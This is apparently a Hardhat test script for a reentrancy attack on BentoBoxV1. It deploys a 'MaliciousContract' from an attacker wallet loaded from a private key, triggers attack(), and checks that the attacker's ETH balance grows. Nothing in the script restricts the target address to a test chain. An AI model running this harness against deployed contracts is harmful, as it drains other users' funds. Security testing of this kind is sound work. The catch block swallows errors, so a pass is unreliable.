const { ethers } = require("hardhat");
const { expect } = require("chai");
require("dotenv").config();

describe("BentoBoxV1 Reentrancy Attack Test", function () {
    let deployer, attacker;
    let bentoBox, maliciousContract;

    before(async function () {
        [deployer] = await ethers.getSigners();

        // Initialize the attacker with the private key and connect to the provider
        attacker = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);

        // Connect to the BentoBox contract using the address from .env
        const BentoBox = await ethers.getContractAt("BentoBoxV1", process.env.BENTOBOX_ADDRESS);
        bentoBox = BentoBox.connect(deployer);
        console.log("Connected to BentoBox at:", bentoBox.address);

        // Deploy MaliciousContract targeting BentoBox
        const MaliciousContract = await ethers.getContractFactory("MaliciousContract", attacker);
        maliciousContract = await MaliciousContract.deploy(bentoBox.address);
        await maliciousContract.deployed();
        console.log("MaliciousContract deployed to:", maliciousContract.address);
    });

    it("should exploit reentrancy vulnerability in withdraw", async function () {
        try {
            // Check the initial balance of the attacker
            const initialBalance = await ethers.provider.getBalance(attacker.address);
            console.log("Attacker initial balance:", ethers.utils.formatEther(initialBalance), "ETH");

            // Perform the attack with correctly structured transaction overrides
            const tx = await maliciousContract.connect(attacker).attack({
                gasLimit: 5000000, // Set the gas limit for the transaction
                // value: ethers.utils.parseEther("1.0") // Uncomment if sending Ether is necessary
            });

            const receipt = await tx.wait();
            console.log("Attack executed, transaction hash:", receipt.transactionHash);

            // Check the final balance of the attacker
            const finalBalance = await ethers.provider.getBalance(attacker.address);
            console.log("Attacker final balance:", ethers.utils.formatEther(finalBalance), "ETH");

            // Assert that the attacker's balance has increased
            expect(finalBalance).to.be.gt(initialBalance);
        } catch (error) {
            console.error("Error during attack:", error);
        }
    });
});
